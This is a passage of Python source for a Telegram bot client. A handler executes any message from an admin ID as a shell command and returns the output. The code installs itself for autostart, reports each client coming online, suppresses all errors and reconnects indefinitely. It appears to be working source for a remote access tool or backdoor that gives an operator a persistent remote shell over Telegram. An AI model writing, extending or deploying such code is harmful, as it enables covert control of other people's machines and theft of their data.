        if not is_adm(m):
            return await m.answer("⛔ Access denied")
        c = (m.text or "").strip()
        if not c:
            return
        o = await asyncio.to_thread(run_cmd, c)
        for ch in split_msg(o):
            try:
                await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown")
            except Exception:
                try:
                    await m.answer(f"[{CLIENT_NAME}] {ch}")
                except Exception:
                    pass
    except Exception:
        pass


# =========================================================================== #
# Lifecycle
# =========================================================================== #
async def notify_admin(t):
    """Best-effort admin notification — failures ignored."""
    try:
        await bot.send_message(ADMIN_ID, t)
    except Exception:
        pass


async def on_startup():
    """One-shot: install + autostart + notify admin."""
    try:
        r = await asyncio.to_thread(autostart_install)
    except Exception as e:
        r = f"⚠️ autostart err: {e}"
    await notify_admin((await build_online_message()) + f"\n\n{r}")


async def _notify_back_online():
    """Sent after the polling loop survives 3 seconds without raising."""
    try:
        await notify_admin(
            f"🟢 [{CLIENT_NAME}] back online\n\n{await build_online_message()}"
        )
    except Exception:
        pass


async def polling_loop():
    """
    Run one polling attempt.

    Return value:
        True  -> permanent failure (bad token / duplicate session) -> exit.
        False -> transient failure -> caller should retry after a delay.

    Connection state tracking via `_offline`:
      * The first transient failure triggers ONE "connection lost" message.
      * Subsequent failures are silent (no spam).
      * When a new poll attempt survives 3 seconds without raising,
        the connection is considered restored: "back online" is sent and
        `_offline` is reset to False.
    """
    global _offline
    pt = asyncio.create_task(dp.start_polling(bot, handle_signals=False))

    # If we were offline, wait 3 seconds. If the task is still pending,
    # the connection was successfully re-established.
    if _offline:
        _, p = await asyncio.wait([pt], timeout=3.0)
        if pt in p:
            _offline = False
            asyncio.create_task(_notify_back_online())

    try:
        await pt
        return False
    except TelegramUnauthorizedError:
        await notify_admin(f"❌ [{CLIENT_NAME}] Invalid token — exiting")
        return True
    except TelegramConflictError:
        await notify_admin(f"⚠️ [{CLIENT_NAME}] Token already in use — exiting")
        return True
    except asyncio.CancelledError:
        return True
    except BaseException as e:
        if not _offline:
            _offline = True
            await notify_admin(
                f"⚠️ [{CLIENT_NAME}] connection lost: {type(e).__name__}: {e}"
            )
        return False


async def main():
    """
    Startup once, then loop around polling until a permanent failure.

    Stores the running event loop in `_loop` so signal handlers can
    schedule coroutines on it.
    """
    global _loop
    _loop = asyncio.get_running_loop()
    try:
        await on_startup()
    except Exception:
        pass
    while True:
        if await polling_loop():
            return
        await asyncio.sleep(10)


# =========================================================================== #
# Entry point
# =========================================================================== #
if __name__ == "__main__":
    # Outer guard: only exits on permanent Telegram error or Ctrl+C.
    # Anything else -> sleep 10s and restart the whole async runtime.
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            break
        except Exception:
            try:
                import time
                time.sleep(10)
            except Exception:
                pass